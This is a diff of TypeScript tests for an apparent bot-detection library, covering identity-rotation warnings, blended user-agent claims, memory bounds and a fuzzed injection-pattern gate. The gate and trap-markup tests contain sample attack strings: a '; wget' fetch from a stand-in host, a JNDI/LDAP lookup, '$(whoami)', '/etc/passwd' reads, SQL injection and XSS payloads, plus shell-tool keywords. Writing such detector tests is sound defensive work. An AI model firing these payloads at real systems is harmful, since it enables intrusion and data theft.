@@ -6,6 +6,11 @@ import { cadenceDetector } from "../src/detectors/cadence.js";
 import { crawlBreadthDetector } from "../src/detectors/crawl-breadth.js";
 import { parameterSweepDetector } from "../src/detectors/parameter-sweep.js";
 import { transportCoherenceDetector } from "../src/detectors/transport-coherence.js";
+import { defaultDetectors } from "../src/detectors/index.js";
+import { DEFAULT_TRAP_PATHS, renderTrapField, renderTrapLink, trapRobotsEntries } from "../src/detectors/trap.js";
+import { __payloadInternals } from "../src/detectors/probe-signature.js";
+import type { RequestFacts } from "../src/types.js";
+import type { BotHandlerConfig } from "../src/config.js";
 import { clientHintsDetector } from "../src/detectors/client-hints.js";
 import { crawlerVerificationDetector } from "../src/detectors/crawler-verification.js";
 import { fetchMetadataDetector } from "../src/detectors/fetch-metadata.js";
@@ -974,5 +979,370 @@ describe("catching a walk through the ids", () => {
   it("does not mistake a timestamp for an identifier", async () => {
     // Nobody walks epoch seconds, and treating them as a range makes every span meaningless.
     expect(walked(await walk(60, (i) => `/log/${1_700_000_000 + i}`))).toBe(false);
+  });
+});
+
+/**
+ * Enabling identity-rotation without moving the actor key.
+ *
+ * The detector reads "one actor, several User-Agents" as one client lying, and under the
+ * default actor key one actor is one *address* — so an office, a campus or a mobile
+ * carrier's CGNAT pool is a hundred people's browsers wearing one. It is off by default
+ * and says so; this catches switching it on without the other half of the change, which
+ * is a decision nobody can see the consequences of until real visitors are challenged.
+ *
+ * Worth recording why the detector cannot simply be made safe instead. A rotator changes
+ * the User-Agent and nothing else, so "several User-Agents behind one header shape" looks
+ * like a clean discriminator — until it is measured. Ten real browser profiles collapse
+ * to six stable shapes, and Chrome, Edge, Opera and Chromium-on-Linux share one, because
+ * they are the same engine sending the same headers in the same order. An office running
+ * Chrome and Edge is that signature exactly.
+ */
+describe("enabling identity-rotation", () => {
+  const warningsFrom = (options: BotHandlerConfig = {}): string[] => {
+    const warnings: string[] = [];
+    new BotHandler({ ...options, onWarning: (warning) => warnings.push(warning) });
+    return warnings;
+  };
+  const rotation = (warnings: string[]): boolean => warnings.some((warning) => warning.includes("identity-rotation is enabled"));
+
+  it("says something when it is switched on behind an address", () => {
+    const warnings = warningsFrom({ extraDetectors: [identityRotationDetector()] });
+    expect(rotation(warnings)).toBe(true);
+    // And names the fix rather than only the problem.
+    expect(warnings.find((warning) => warning.includes("identity-rotation is enabled"))).toContain("actorKey");
+  });
+
+  it("catches it however the detector got into the list", () => {
+    expect(rotation(warningsFrom({ detectors: [...defaultDetectors(), identityRotationDetector()] }))).toBe(true);
+  });
+
+  it("stays quiet once the actor key is narrower than an address", () => {
+    expect(rotation(warningsFrom({ extraDetectors: [identityRotationDetector()], actorKey: (facts: RequestFacts) => `${facts.ip}|${facts.tlsFingerprint ?? ""}` }))).toBe(false);
+  });
+
+  it("stays quiet when the detector is not enabled, which is the default", () => {
+    expect(rotation(warningsFrom())).toBe(false);
+  });
+});
+
+/**
+ * What a series of claims says, as opposed to what one claim says.
+ *
+ * Every other identity check here reads a single request. The set of identities an actor
+ * has claimed over time is a different object, and some sets are self-contradictory in a
+ * way no member of them is.
+ *
+ * These hold under the default address-based actor key, which is why they are on and
+ * `identity-rotation` is not. A NAT presents many browsers — that is exactly what makes
+ * counting User-Agents useless there. It does not present sqlmap *and* nikto.
+ */
+describe("reading the set of identities an actor has claimed", () => {
+  const SQLMAP = "sqlmap/1.7.2#stable (http://sqlmap.org)";
+  const NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)";
+  const GOOGLE = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+  const BING = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)";
+  const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+  // Nothing can be confirmed or refuted, so anything found is found from the claims alone.
+  const resolver = failingResolver();
+
+  const visit = async (agents: readonly string[], paths?: readonly string[]): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
+    const handler = new BotHandler({ preset: "protect-content", resolver });
+    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
+    for (let i = 0; i < agents.length; i++) {
+      const result = await handler.handle(
+        createFacts({
+          method: "GET",
+          url: paths?.[i] ?? `/page/${i}`,
+          headers: { host: "shop.example", "user-agent": agents[i] ?? "", accept: "*/*" },
+          ip: "203.0.113.151",
+          timestamp: 1_700_000_000_000 + i * 1000,
+        }),
+      );
+      last = result.assessment;
+    }
+    return last as Awaited<ReturnType<BotHandler["assess"]>>;
+  };
+  const blended = (assessment: { evidence: Array<{ detector: string; summary: string }> }): string[] =>
+    assessment.evidence.filter((item) => item.detector === "blended-identity").map((item) => item.summary);
+
+  it("reads two named security tools from one address as a scan", async () => {
+    expect(blended(await visit([SQLMAP, NIKTO])).join(" ")).toContain("2 different security tools");
+    // One is a tool. Two is a scan.
+    expect(blended(await visit([SQLMAP, SQLMAP, SQLMAP]))).toEqual([]);
+  });
+
+  it("reads two crawler claims as a forgery, with no lookup at all", async () => {
+    // At most one of these can be true of an address: each operator publishes a proof tied
+    // to addresses it controls. With DNS unreachable neither claim can be refuted on its
+    // own, and the pair still contradicts itself.
+    const both = blended(await visit([GOOGLE, BING, GOOGLE])).join(" ");
+    expect(both).toContain("2 crawler identities");
+    expect(blended(await visit([GOOGLE, GOOGLE, GOOGLE]))).toEqual([]);
+  });
+
+  it("reads a crawler claim beside a scanner payload as the answer to which is the lie", async () => {
+    // The payload is noted after its own request is assessed, so it is the *next* request
+    // that sees it — this is a cross-request reading by construction.
+    const found = blended(await visit([GOOGLE, GOOGLE, GOOGLE], ["/", "/?id=1' OR '1'='1", "/next"])).join(" ");
+    expect(found).toContain("scanner payload");
+  });
+
+  it("stays quiet behind a gateway, which is where identity-rotation cannot", async () => {
+    const nat = [CHROME, CHROME.replace("Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7"), CHROME.replace("Chrome/120", "Chrome/121")];
+    expect(blended(await visit(nat))).toEqual([]);
+    // An office whose staff browse while a crawler indexes the same site.
+    expect(blended(await visit([GOOGLE, CHROME]))).toEqual([]);
+  });
+
+  it("does not reach `certain`, because a misconfigured proxy makes the same set", async () => {
+    // Trusting the wrong forwarded header collapses every client onto one address, and
+    // then two genuinely different crawlers look like one client lying.
+    for (const summary of await visit([GOOGLE, BING]).then((a) => a.evidence.filter((item) => item.detector === "blended-identity"))) {
+      expect(summary.certainty).not.toBe("certain");
+    }
+  });
+});
+
+/**
+ * What a client can make an actor cost.
+ *
+ * Everything the registry remembers is keyed on something the client chose — the path, the
+ * query, the method — so every one of them needs a bound, and the bounds need a test
+ * because they are invisible when they work. Two of these were found by measuring rather
+ * than by reading: walk templates were kept as the whole path, at 20.6 kB per actor and
+ * roughly four hundred megabytes across a full registry; and building those templates by
+ * concatenation cost 3.65µs per request against 199ns for an ordinary path, which is an
+ * eighteen-fold tax anyone could levy by sending a long URL.
+ */
+describe("what a hostile path can cost the registry", () => {
+  const at = 1_700_000_000_000;
+  const record = (state: ActorState, url: string, index = 0): void => {
+    state.record(createFacts({ method: "GET", url, headers: { host: "shop.test", "user-agent": "curl/8.4.0" }, ip: "203.0.113.4", timestamp: at + index }));
+  };
+
+  it("does not keep a whole path as a key", () => {
+    const state = new ActorState("k", at);
+    const deep = `/${Array.from({ length: 12 }, (_, i) => "segment".repeat(4) + i).join("/")}/42`;
+    record(state, deep);
+    const walk = state.densestWalk();
+    // Kept, because it is a walk — but not at its original length.
+    expect(walk).toBeDefined();
+    expect(walk?.template.length).toBeLessThanOrEqual(121);
+    expect(deep.length).toBeGreaterThan(200);
+  });
+
+  it("ignores a path too deep to be a shape anybody walks", () => {
+    const state = new ActorState("k", at);
+    for (let i = 0; i < 40; i++) record(state, `/${Array.from({ length: 40 }, (_, n) => `s${n}`).join("/")}/${i}`, i);
+    expect(state.densestWalk()).toBeUndefined();
+  });
+
+  it("ignores a path too long to be one either", () => {
+    const state = new ActorState("k", at);
+    for (let i = 0; i < 40; i++) record(state, `/${"x".repeat(2_000)}/${i}`, i);
+    expect(state.densestWalk()).toBeUndefined();
+  });
+
+  it("still finds the walks that matter", () => {
+    // The bounds are worthless if they also exclude the thing being looked for.
+    const state = new ActorState("k", at);
+    for (let i = 0; i < 40; i++) record(state, `/api/v2/orders/${i}`, i);
+    expect(state.densestWalk()).toEqual({ template: "/api/v2/orders/#", count: 40, span: 40 });
+  });
+
+  it("does not fold an unreasonable number of query parameters", () => {
+    const state = new ActorState("k", at);
+    const many = Array.from({ length: 300 }, (_, i) => `k${i}=${i}`).join("&");
+    for (let i = 0; i < 10; i++) record(state, `/x?${many}&n=${i}`, i);
+    // Not counted: sorting three hundred keys per request is work a client should not be
+    // able to ask for, and a signature over them says nothing anyway.
+    expect(state.distinctQueries).toBe(0);
+    // A normal query still counts.
+    const ordinary = new ActorState("k2", at);
+    for (let i = 0; i < 10; i++) record(ordinary, `/products?page=${i}&sort=price`, i);
+    expect(ordinary.distinctQueries).toBe(10);
+  });
+
+  it("keeps every per-actor structure bounded", () => {
+    const state = new ActorState("k", at);
+    for (let i = 0; i < 500; i++) {
+      state.record(
+        createFacts({
+          method: ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", `X${i}`][i % 8] ?? "GET",
+          url: `/shape${i}/${i}?p=${i}`,
+          headers: { host: "shop.test", "user-agent": `agent-${i}` },
+          ip: "203.0.113.4",
+          timestamp: at + i,
+        }),
+      );
+      state.noteIdentity(`bot-${i}`, "search", false);
+    }
+    expect(state.distinctQueries).toBeLessThanOrEqual(64);
+    expect(state.methodsSeen.length).toBeLessThanOrEqual(12);
+    expect(state.claimedIdentities.size).toBeLessThanOrEqual(12);
+    expect(state.distinctPaths).toBeLessThanOrEqual(64);
+  });
+});
+
+/**
+ * `probe-signature` runs nine regular expressions over every query value, and a request
+ * may carry sixty-four of them — five hundred and seventy-six evaluations, which took the
+ * detector from 4.5us to 35.5us and doubled the cost of the whole assessment on nothing
+ * but a long URL. A one-character gate skips values that cannot match.
+ *
+ * A gate like that is a second, weaker copy of the thing it guards, and the failure mode
+ * is silent: widen a pattern later, forget the gate, and injection detection quietly
+ * stops working on the values the gate rejects. That is a security hole rather than a
+ * slowdown, so it is not left to review. This asserts the property directly — over
+ * random strings built from the pieces the patterns are made of, nothing the gate
+ * rejects may match anything the gate guards.
+ */
+describe("the payload gate cannot hide a payload", () => {
+  const { PAYLOADS, PAYLOAD_GATE } = __payloadInternals;
+
+  it("rejects only values that no pattern could have matched", () => {
+    // Fragments of the patterns themselves, so the random strings land near the edges
+    // rather than in open space.
+    const pieces = [
+      "union", "select", "all", "or", "1", "=", "'", '"', "sleep", "(", ")", "pg_sleep", "waitfor", "delay",
+      "<", "script", ">", "onerror", "onload", "onmouseover", "$", "{", "jndi", ":", "ldap", "//", "`",
+      "wget", "curl", "nc", "bash", "sh", "cat", "ls", "id", "whoami", "uname", "python", "perl",
+      "file", "php", "expect", ";", "&", "|", " ", "\t", "\n", "-", "*", "/", "%27", "%22", "a", "Z", "9", "_", ".", "é",
+    ];
+    let rejected = 0;
+    for (let round = 0; round < 300_000; round++) {
+      let value = "";
+      const n = 1 + Math.floor(Math.random() * 8);
+      for (let i = 0; i < n; i++) value += pieces[Math.floor(Math.random() * pieces.length)];
+      if (PAYLOAD_GATE.test(value)) continue;
+      rejected++;
+      for (const { pattern, what } of PAYLOADS) {
+        // A failure here names the value and the pattern, which is what makes it fixable.
+        if (pattern.test(value)) throw new Error(`gate rejected ${JSON.stringify(value)} but ${what} matches it`);
+      }
+    }
+    // The fuzz is worthless if it never actually exercised the rejecting branch.
+    expect(rejected).toBeGreaterThan(1000);
+  });
+
+  it("lets through a known example of every pattern it guards", () => {
+    const samples = [
+      "${jndi:ldap://x.test/a}",
+      "; wget http://x.test/s",
+      "$(whoami)",
+      "file:///etc/passwd",
+      "1 union select null",
+      "1 or '1'='1",
+      "1 and sleep(5)",
+      "<script>alert(1)</script>",
+      "x onerror=alert(1)",
+    ];
+    expect(samples.length).toBe(PAYLOADS.length);
+    for (const sample of samples) {
+      expect(PAYLOAD_GATE.test(sample), `gate rejected ${sample}`).toBe(true);
+      expect(PAYLOADS.some(({ pattern }) => pattern.test(sample)), `no pattern matched ${sample}`).toBe(true);
+    }
+  });
+
+  it("still finds a payload hidden among many ordinary parameters", async () => {
+    // The point of the gate is that the sixty-third parameter is still read.
+    const filler = Array.from({ length: 60 }, (_, i) => `key${i}=value${i}`).join("&");
+    const handler = new BotHandler({ onWarning: () => {} });
+    const assessment = await handler.assess(
+      createFacts({
+        method: "GET",
+        url: `/search?${filler}&q=${encodeURIComponent("${jndi:ldap://x.test/a}")}`,
+        headers: { host: "shop.test", "user-agent": "curl/8.4.0" },
+        ip: "203.0.113.30",
+      }),
+    );
+    const probe = assessment.evidence.find((item) => item.detector === "probe-signature");
+    expect(probe?.summary).toContain("JNDI");
+  });
+});
+
+/**
+ * The three helpers that emit markup into somebody else's page.
+ *
+ * They had no tests at all — `entry-points.test.ts` checked that the names were exported
+ * and nothing checked what they produced. That is the wrong place to have a gap: their
+ * output is HTML an operator pastes into their own site, so an escaping regression here
+ * would be an injection the library handed them, and it would not fail anything.
+ */
+describe("the markup the trap helpers hand an operator", () => {
+  const HOSTILE = ['"><script>alert(1)</script>', "' onmouseover='alert(1)", "<img src=x onerror=alert(1)>", "a&b"];
+
+  /**
+   * Counting the tags the function opens is the assertion that actually means something.
+   * A payload that escaped its attribute would have to introduce a `<` of its own, so a
+   * template that emits exactly N of them and still emits N has not been broken out of.
+   */
+  const angleBrackets = (html: string): number => html.split("<").length - 1;
+
+  it("escapes a hostile label rather than emitting it", () => {
+    for (const bad of HOSTILE) {
+      const html = renderTrapLink("/archive", { label: bad });
+      expect(html, bad).toContain('href="/archive"');
+      // Verbatim is the tell: an unescaped payload appears exactly as it was passed.
+      expect(html.includes(bad), bad).toBe(false);
+      // `<a …>` and `</a>`, and nothing the label brought with it.
+      expect(angleBrackets(html), bad).toBe(2);
+    }
+  });
+
+  it("escapes a hostile field name in every place it puts it", () => {
+    for (const bad of HOSTILE) {
+      const html = renderTrapField(bad);
+      expect(html.includes(bad), bad).toBe(false);
+      // `<div>`, `<label>`, `</label>`, `<input>`, `</div>` — five, and no more.
+      expect(angleBrackets(html), bad).toBe(5);
+      // The name lands in three attributes, and the escaped form is what appears.
+      expect(html.match(/&quot;|&#39;|&lt;|&amp;/), bad).not.toBeNull();
+    }
+  });
+
+  it("works with no argument, the way the documentation shows it", () => {
+    // `docs/detection/detectors.md` has always written `renderTrapLink()`, and until this
+    // defaulted that example threw — copy it into a route handler and the route 500s.
+    // `trapRobotsEntries` already defaults to the same shipped paths.
+    const html = renderTrapLink();
+    expect(html).toContain(`href="${DEFAULT_TRAP_PATHS[0] as string}"`);
+    expect(() => renderTrapLink()).not.toThrow();
+  });
+
+  it("refuses a path that could never be a trap", () => {
+    // A trap is matched against `facts.path`, which always begins with a slash. Anything
+    // else is decoration that can never fire — and it is how a scheme would reach the
+    // href, which escaping does not prevent.
+    expect(() => renderTrapLink("javascript:alert(1)")).toThrow(/must begin with/);
+    expect(() => renderTrapLink("https://example.test/trap")).toThrow(/must begin with/);
+    expect(() => renderTrapLink("")).toThrow(/must begin with/);
+    expect(() => renderTrapLink("/legitimate")).not.toThrow();
+  });
+
+  it("keeps the link away from people and from crawlers that ask", () => {
+    // The point of the markup: a screen reader and a keyboard must never reach it, and a
+    // crawler that obeys instructions should be told not to follow it.
+    const html = renderTrapLink("/archive");
+    expect(html).toContain('aria-hidden="true"');
+    expect(html).toContain('tabindex="-1"');
+    expect(html).toContain("nofollow");
+  });
+
+  it("hides the honeypot field from people the same way", () => {
+    const html = renderTrapField("website");
+    expect(html).toContain('aria-hidden="true"');
+    expect(html).toContain('tabindex="-1"');
+    expect(html).toContain('autocomplete="off"');
+    expect(html).toContain('name="website"');
+  });
+
+  it("writes robots.txt lines for the paths it is given", () => {
+    expect(trapRobotsEntries(["/archive", "/old"])).toBe("User-agent: *\nDisallow: /archive\nDisallow: /old");
+    // The default set is what an operator gets when they pass nothing, and every one of
+    // them has to be site-relative or it could not be a trap in the first place.
+    expect(trapRobotsEntries().startsWith("User-agent: *\n")).toBe(true);
+    expect(DEFAULT_TRAP_PATHS.every((path) => path.startsWith("/"))).toBe(true);
   });
 });
